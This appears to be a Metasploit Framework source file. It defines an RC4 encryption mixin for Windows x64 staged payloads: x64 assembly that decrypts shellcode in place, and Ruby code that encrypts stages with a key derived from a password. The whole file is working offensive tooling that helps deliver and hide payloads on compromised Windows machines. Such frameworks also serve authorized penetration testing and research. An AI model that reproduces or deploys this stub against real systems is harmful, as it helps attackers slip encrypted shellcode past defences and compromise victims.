# -*- coding: binary -*-

require 'msf/core'

module Msf

###
#
# RC4 decryption stub for Windows ARCH_X64 payloads
#
###
module Payload::Windows::Rc4_x64
  #
  # Register rc4 specific options
  #
  def initialize(*args)
    super
    register_options([ OptString.new('RC4PASSWORD', [true, 'Password to derive RC4 key from', 'msf']) ], self.class)
  end

  #
  # Generate assembly code that decrypts RC4 shellcode in-place
  #

  def asm_decrypt_rc4
    %!
       ;-----------------------------------------------------------------------------;
       ; Author: max3raza
       ; Version: 1.0 (12 January 2018)
       ;-----------------------------------------------------------------------------;
       ; Input: R9 - Data to decode
       ;        RCX - Data length
       ;        RSI - Key (16 bytes for simplicity and smaller code)
       ;        RDI - pointer to 0x100 bytes scratch space for S-box
       ; Direction flag has to be cleared
       ; Output: None. Data is decoded in place.
       ; Clobbers: RAX, RBX, RCX, RDX, R8, R9, RDI (stack is not used)
       ; Initialize S-box
         xor rax, rax           ; Start with 0
         mov r8, rdi            ; Save pointer to S-box
       init:
         stosb                  ; Store next S-Box byte S[i] = i
         inc al                 ; increase byte to write (RDI is increased automatically)
         jnz init               ; loop until we wrap around
       ; permute S-box according to key
         xor rbx, rbx           ; Clear RBX (RAX is already cleared)
       permute:
         add bl, [r8+rax]      ; BL += S[AL] + KEY[AL % 16]
         mov rdx, rax
         and dl, 0xF
         add bl, [rsi+rdx]
         mov dl, [r8+rax]      ; swap S[AL] and S[BL]
         xchg dl, [r8+rbx]
         mov [r8+rax], dl
         inc al                 ; AL += 1 until we wrap around
         jnz permute
       ; decryption loop
         xor rbx, rbx           ; Clear RBX (RAX is already cleared)
       decrypt:
         inc al                 ; AL += 1
         add bl, [r8+rax]      ; BL += S[AL]
         mov dl, [r8+rax]      ; swap S[AL] and S[BL]
         xchg dl, [r8+rbx]
         mov [r8+rax], dl
         add dl, [r8+rbx]      ; DL = S[AL]+S[BL]
         mov dl, [r8+rdx]      ; DL = S[DL]
         xor [r9], dl          ; [R9] ^= DL
         inc r9                ; advance data pointer
         dec rcx                ; reduce counter
         jnz decrypt            ; until finished
     !
  end

  def generate_stage(opts = {})
    p = super(opts)
    xorkey, rc4key = rc4_keys(datastore['RC4PASSWORD'])
    c1 = OpenSSL::Cipher.new('RC4')
    c1.decrypt
    c1.key = rc4key
    p = c1.update(p)
    [ p.length ^ xorkey.unpack('V')[0] ].pack('V') + p
  end

  def handle_intermediate_stage(_conn, _payload)
    false
  end

  private

  def rc4_keys(rc4pass = '')
    m = OpenSSL::Digest.new('sha1')
    m.reset
    key = m.digest(rc4pass)
    [key[0, 4], key[4, 16]]
  end
end
end
